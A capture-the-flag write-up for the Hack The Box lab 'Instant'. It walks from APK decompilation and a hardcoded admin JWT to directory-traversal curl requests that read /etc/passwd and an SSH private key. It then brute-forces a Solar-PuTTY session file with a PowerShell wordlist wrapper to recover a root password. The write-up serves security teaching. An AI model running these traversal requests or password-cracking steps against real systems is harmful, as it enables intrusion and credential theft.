---
layout: post
title: "HTB: Instant"
box: instant
img: /img/instant/instant
author: Andrew Cherney
date: 2025-03-01
tags: htb medium-box season-6 linux apktool jwt webapp directory-traversal lfi powershell
icon: "assets/icons/instant.png"
post_description: "Starts off with an apk download into some analysis. After finding two subdomains and a jwt within an activity, the API can be called for LFI. Once SSH'd in a session file can be found for Solar-PUTTY. With a decrypting executable and a wrapper it is possible to find the password for the session and get the root password. Cool box that let me solidify my apk knowledge and enumeration methods."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
rustscan 10.129.27.92
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.129.27.92:22
Open 10.129.27.92:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.129.27.92

Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-14 16:15 UTC
Initiating Ping Scan at 16:15
Scanning 10.129.27.92 [2 ports]
Completed Ping Scan at 16:15, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:15
Completed Parallel DNS resolution of 1 host. at 16:15, 0.14s elapsed
DNS resolution of 1 IPs took 0.14s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:15
Scanning 10.129.27.92 [2 ports]
Discovered open port 80/tcp on 10.129.27.92
Discovered open port 22/tcp on 10.129.27.92
Completed Connect Scan at 16:15, 0.08s elapsed (2 total ports)
Nmap scan report for 10.129.27.92
Host is up, received syn-ack (0.13s latency).
Scanned at 2024-10-14 16:15:47 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

```bash
nmap -sCV -p22,80 10.129.27.92
Starting Nmap 7.92 ( https://nmap.org ) at 2024-10-14 11:16 CDT
Nmap scan report for 10.129.27.92
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://instant.htb/
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add that to my **/etc/hosts** file and head over.


## Port 80

{% include img_link src="/img/instant/instant_01_80_front_page" alt="front_page" ext="png" trunc=600 %}

```bash
dirsearch -u http://instant.htb -x 403

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Instant/reports/http_instant.htb/_24-10-14_11-19-23.txt

Target: http://instant.htb/

[11:19:23] Starting: 
[11:19:25] 301 -  307B  - /js  ->  http://instant.htb/js/
[11:20:26] 301 -  308B  - /css  ->  http://instant.htb/css/
[11:20:31] 200 -   16B  - /downloads/
[11:20:31] 301 -  314B  - /downloads  ->  http://instant.htb/downloads/
[11:20:43] 301 -  308B  - /img  ->  http://instant.htb/img/
[11:20:46] 301 -  315B  - /javascript  ->  http://instant.htb/javascript/
[11:20:47] 200 -   16B  - /js/
```


The "download now" and "join the community" buttons both download the **instant.apk**, the app for their wallet/banking/crypto(?) transfers.


## instant.apk

### emulation

My first idea was to emulate the app and get a feel for how it works. To do this I can use [https://appetize.io/](https://appetize.io/) an online app emulator which only requires an account to use. Upload the app, select an android phone, then emulate the app in that order.

![setup and upload app]({{ page.img }}_02_appetize_apps.png)

![phone setup]({{ page.img }}_03_phone_setup.png)

![app login]({{ page.img }}_04_app_login.png)

So far so good on the emulation side. Now here we are presented a login screen, which could spell trouble for my plans of emulating further. In concept there is an API handling requests and this site will not have access to that API. To demonstrate I will try to register.

![register on app fail]({{ page.img }}_05_app_register.png)

Upon attempting to register I am presented with a message saying I cannot connect to "http://mywalletv1.instant.htb" and that domain has nothing to offer: 

```bash
dirsearch -u http://mywalletv1.instant.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Instant/reports/http_mywalletv1.instant.htb/_24-10-14_11-41-18.txt

Target: http://mywalletv1.instant.htb/

[11:41:18] Starting: 
[11:42:39] 403 -  287B  - /server-status
[11:42:39] 403 -  287B  - /server-status/
```

But that gave me an idea. Android apps normally have their networking information within a file after unpacking the *.apk*. First we need to use apktool to unpack the archive, then we can look through the listed domains to interact with and activities.

```bash
apktool d instant.apk -o ./app
I: Using Apktool 2.5.0-dirty on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/raccoon/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
--[snip]--
```


### subdomains

```
cat res/xml/network_security_config.xml 

<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

Swagger means there are API calls, probably the ones being sent by the mobile app. Swagger also means documentation typically. Where the API calls will be thoroughly documented and allow for sending requests (or forming requests) from the UI itself.

{% include img_link src="/img/instant/instant_06_swagger_ui" alt="swagger_ui" ext="png" trunc=600 %}


### AdminActivities

Next on the list is potential activities within the app. In short for android activities are like a single screen with a user interface powered by the equivalent of a main() function. They can be found by searching for the com directory and diving into it, though mileage depending on app may vary. Here the location I care about is */smali/com/instant/instantlabs/instant*.

```bash
ls smali/com/instant/instantlabs/instant

'AdminActivities$1.smali'         'ProfileActivity$1$2.smali'  'RegisterActivity$3$1.smali'
 AdminActivities.smali            'ProfileActivity$1.smali'    'RegisterActivity$3$2.smali'
'ForgotPasswordActivity$1.smali'  'ProfileActivity$2.smali'    'RegisterActivity$3$3.smali'
 ForgotPasswordActivity.smali      ProfileActivity.smali       'RegisterActivity$3.smali'
'LoginActivity$1.smali'           'R$color.smali'               RegisterActivity.smali
'LoginActivity$2.smali'           'R$drawable.smali'            R.smali
'LoginActivity$3.smali'           'R$id.smali'                 'SplashActivity$1.smali'
'LoginActivity$4$1.smali'         'R$layout.smali'              SplashActivity.smali
'LoginActivity$4$2.smali'         'R$mipmap.smali'             'TransactionActivity$1.smali'
'LoginActivity$4$3.smali'         'R$string.smali'             'TransactionActivity$2$1.smali'
'LoginActivity$4.smali'           'R$style.smali'              'TransactionActivity$2$2$1.smali'
 LoginActivity.smali              'R$xml.smali'                'TransactionActivity$2$2.smali'
 MainActivity.smali               'RegisterActivity$1.smali'   'TransactionActivity$2.smali'
'ProfileActivity$1$1.smali'       'RegisterActivity$2.smali'    TransactionActivity.smali
```

Those AdminActivities might have something useful within them. Specifically why would there need to be any admin activity on the mobile app if it didn't have some convenience baked in?


```bash
cat AdminActivities.smali
.class public Lcom/instantlabs/instant/AdminActivities;
.super Ljava/lang/Object;
.source "AdminActivities.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private TestAdminAuthorization()Ljava/lang/String;
    .locals 4

    .line 22
    new-instance v0, Lokhttp3/OkHttpClient;

    invoke-direct {v0}, Lokhttp3/OkHttpClient;-><init>()V

    .line 23
    new-instance v1, Lokhttp3/Request$Builder;

    invoke-direct {v1}, Lokhttp3/Request$Builder;-><init>()V

    const-string v2, "http://mywalletv1.instant.htb/api/v1/view/profile"

    .line 24
    invoke-virtual {v1, v2}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v1

    const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

    .line 25
    invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v1

    .line 26
    invoke-virtual {v1}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v1

    .line 27
    invoke-virtual {v0, v1}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v0

    new-instance v1, Lcom/instantlabs/instant/AdminActivities$1;

    invoke-direct {v1, p0}, Lcom/instantlabs/instant/AdminActivities$1;-><init>(Lcom/instantlabs/instant/AdminActivities;)V

    invoke-interface {v0, v1}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    const-string v0, "Done"

    return-object v0
.end method
```

A test function was left in with a jwt available. This should allow me to probe the API further.

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA

{
  "id": 1,
  "role": "Admin",
  "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
  "exp": 33259303656
}
```

# User as shirohige

## API LFI

Through this user interface I can add the authorize token (the jwt we found) and use some of the apps intended functionality. First I want to register and login, and I'll use the web ui initially here to show it off for all unfamiliar.

![register request]({{ page.img }}_07_swagger_register.png)

![register response]({{ page.img }}_08_swagger_register_response.png)

![login request]({{ page.img }}_09_swagger_login.png)

![login response]({{ page.img }}_10_swagger_login_response.png)

Successful login that produces a jwt. Now my eye turns to the admin api options of users, logs and log.

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/list/users" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"Status":200,"Users":[{"email":"admin@instant.htb","role":"Admin","secret_pin":87348,"status":"active","username":"instantAdmin","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},{"email":"shirohige@instant.htb","role":"instantian","secret_pin":42845,"status":"active","username":"shirohige","wallet_id":"458715c9-b15e-467b-8a3d-97bc3fcf3c11"},{"email":"raccoon@raccoon.xyz","role":"instantian","secret_pin":77777,"status":"active","username":"raccoon","wallet_id":"e8fdb478-28df-4a03-a216-ba30b4ef058d"}]}
```

Admin jwt works as intended. Next I will check logs to see what logs are available to view.

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/view/logs" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}
```

Shirohige is the user we will be trying to gain access to apparently. There is one available log to view, so let's view it.

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"/home/shirohige/logs/1.log":["This is a sample log testing\n"],"Status":201}
```

My initial gut feeling is to try a directory traversal to read a different file, given the intake is a parameter specifying a file. I'll try to read the classic */etc/passwd*

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"/home/shirohige/logs/../../../../../../../etc/passwd":["root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n","sys:x:3:3:sys:/dev:/usr/sbin/nologin\n","sync:x:4:65534:sync:/bin:/bin/sync\n","games:x:5:60:games:/usr/games:/usr/sbin/nologin\n","man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n","lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n","mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n","news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n","uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n","proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n","backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n","list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n","irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n","_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n","nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n","systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n","dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n","messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n","systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n","pollinate:x:102:1::/var/cache/pollinate:/bin/false\n","polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n","usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"],"Status":201}
```

Excellent. Now to gamble on if there is an id_rsa or if I will need to get creative. 

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN RSA PRIVATE KEY-----\n","MIIEogIBAAKCAQEAvKToxo7NSyrFUZ93ZtYulgxZl1Mm7JPXD/ihWY4CT06tXLND\n","6uKlsBMm00QazOmRXSsiiCp8AXheYA0FBdFtB0NxQOSqOX8BY831C5rOFXG3ILEw\n","adtXPNow8ro/YsMMz0FpTnSBBK2ClI
--[snip]--
```

Now the key is formatted poorly, but I can set that bracketed part to be an array in python and iterate through the items to print it out in order, trimming the new lines in the process.

```
array_key = ["-----BEGIN RSA PRIVATE KEY-----\n","MIIEogIBAAKCAQEAvKToxo7NSyrFUZ93ZtYulgxZl1Mm7JPXD/ihWY4CT06tXLND\n","6uKlsBMm00QazOmRXSsiiCp8AXheYA0FBdFtB0NxQOSqOX8BY831C5rOFXG3ILEw\n","adtXPNow8ro/YsMMz0FpTnSBBK2ClI+2y4icvV6aES60q6XPkQGWPdLokVUUVBeK\n",
--[snip]--
"NinngYX3g3oq/+5815/3NI7liMASBwdc7Uqw/HkcOsPwKQPxEEM=\n","-----END RSA PRIVATE KEY-----\n"]

for i in array_key:
	print(i.strip())
```


```bash
python3 key_format.py 

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvKToxo7NSyrFUZ93ZtYulgxZl1Mm7JPXD/ihWY4CT06tXLND
6uKlsBMm00QazOmRXSsiiCp8AXheYA0FBdFtB0NxQOSqOX8BY831C5rOFXG3ILEw
--[snip]--
cPKtkGQ0ZCp2ovuCSPvJ4vmO+ewulZp6ZfAMAHw4fntFKme0X4omp+ji7B6HMcRO
NinngYX3g3oq/+5815/3NI7liMASBwdc7Uqw/HkcOsPwKQPxEEM=
-----END RSA PRIVATE KEY-----
```

```bash
ssh shirohige@instant.htb -i id_rsa 

shirohige@instant:~$ ls
logs  projects  user.txt
shirohige@instant:~$ cat user.txt
99d5a14d524---------------------
```

# Root

## enum

```bash
shirohige@instant:~$ sudo -l
[sudo] password for shirohige: 
```

```bash
shirohige@instant:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1334/python3        
tcp        0      0 127.0.0.1:8808          0.0.0.0:*               LISTEN      1338/python3        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   

```

Two potential webservers, with matching pids.

```bash
shirohi+    1334  0.0  2.8 620752 55104 ?        Ss   Oct12   1:03 /home/shirohige/projects/mywallet/myenv/bin/python
root        1337  0.0  0.1   4236  2432 ?        Ss   Oct12   0:00 /usr/sbin/cron -f -P
shirohi+    1338  0.0  3.1 626068 61776 ?        Ss   Oct12   1:05 /home/shirohige/projects/mywallet/myenv/bin/python
```

```bash
shirohige@instant:~$ curl 127.0.0.1:8808
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/apidocs">/apidocs</a>. If not, click the link.
shirohige@instant:~$ curl 127.0.0.1:8888
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

8808 is swagger, 8888 maybe a reverse proxy? I'll come back here if I'm starving for any progress.

```bash
shirohige@instant:~$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
```

```bash
shirohige@instant:~$ ls /opt
backups
shirohige@instant:~$ ls /opt/backups/
Solar-PuTTY
shirohige@instant:~$ ls /opt/backups/Solar-PuTTY/
sessions-backup.dat
```

## Solar-PuTTY sessions

Solar-PuTTY is SolarWind's version of PuTTY with better ui and additional functions. The session files for PuTTY and I'm assuming Solar's version includes credentials and private keys. [https://github.com/VoidSec/SolarPuttyDecrypt/releases/tag/v1.0](https://github.com/VoidSec/SolarPuttyDecrypt/releases/tag/v1.0) is a decrypting script for the sessions.dat file. There is a better explanation of why this sessions file is vulnerable from the github repo, but TLDR; bad design the password is not a master password chosen by the user and the contents (of valuable creds) can be exported with no password or brute forced.

All of the next part was done inside of Windows Sandbox instead of my parrot vm.

```bash
C:\Users\WDAGUtilityAccount\Downloads\SolarPuttyDecrypt_v1>SolarPuttyDecrypt.exe ../session.txt
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec
-----------------------------------------------------

Unhandled Exception: System.IndexOutOfRangeException: Index was outside the bounds of the array.
   at SolarPuttyDecrypt.Program.Main(String[] args) in C:\Users\VoidSec\Documents\GitHub\SolarPuttyDecrypt\SolarPuttyDecrypt\Program.cs:line 14
```

After installing and attempting to run it seems I was missing the password field.

```bash
C:\Users\WDAGUtilityAccount\Downloads\SolarPuttyDecrypt_v1>SolarPuttyDecrypt.exe session.txt aaa
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec
-----------------------------------------------------
System.Security.Cryptography.CryptographicException: Bad Data.

   at System.Security.Cryptography.CryptographicException.ThrowCryptographicException(Int32 hr)
   at System.Security.Cryptography.Utils._DecryptData(SafeKeyHandle hKey, Byte[] data, Int32 ib, Int32 cb, Byte[]& outputBuffer, Int32 outputOffset, PaddingMode PaddingMode, Boolean fDone)
   at System.Security.Cryptography.CryptoAPITransform.TransformFinalBlock(Byte[] inputBuffer, Int32 inputOffset, Int32 inputCount)
   at System.Security.Cryptography.CryptoStream.FlushFinalBlock()
   at System.Security.Cryptography.CryptoStream.Dispose(Boolean disposing)
   at System.IO.Stream.Close()
   at System.IO.Stream.Dispose()
   at Crypto.Decrypt(String passPhrase, String cipherText) in C:\Users\VoidSec\Documents\GitHub\SolarPuttyDecrypt\SolarPuttyDecrypt\Program.cs:line 122
   at SolarPuttyDecrypt.Program.DoImport(String dialogFileName, String password, String CurrDir) in C:\Users\VoidSec\Documents\GitHub\SolarPuttyDecrypt\SolarPuttyDecrypt\Program.cs:line 54
```

Now here I need to crack the password of the sessions file. The executable can try one password at a time so I need to write a wrapper to iterate through a wordlist, or in other words through rockyou. I opted to get Senior Dev Jippity on the case and it churned up something I modified for powershell:

```bash
$executable = "C:\Users\WDAGUtilityAccount\Downloads\SolarPuttyDecrypt_v1/SolarPuttyDecrypt.exe"
$wordlist = "C:\Users\WDAGUtilityAccount\Downloads\SolarPuttyDecrypt_v1/rockyou.txt"

Get-Content -Path $wordlist | ForEach-Object {
    $word = $_.Trim()
    Write-Host "Trying $word"

    try {
      $output = & $executable session.txt $word 2>&1
    }
    catch {
	Write-Host "Error: $_"
    }
}
```

Name that bad boy **wrapper.ps1** and run it in powershell. Don't forget to enable running scripts if you also use Windows Sandbox like me. A successful decryption will place the txt file on the user's desktop, and it happened on the word estrella (I had to grab a chunk of names and test them manually for around when it happened). The results of the file are as follows:

```json
{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```

root(?) password, always worth a shot testing if it works.

```bash
shirohige@instant:~$ su root
Password: 
root@instant:/home/shirohige# cd ~
root@instant:~# cat root.txt
a6ca259f38f2--------------------
```

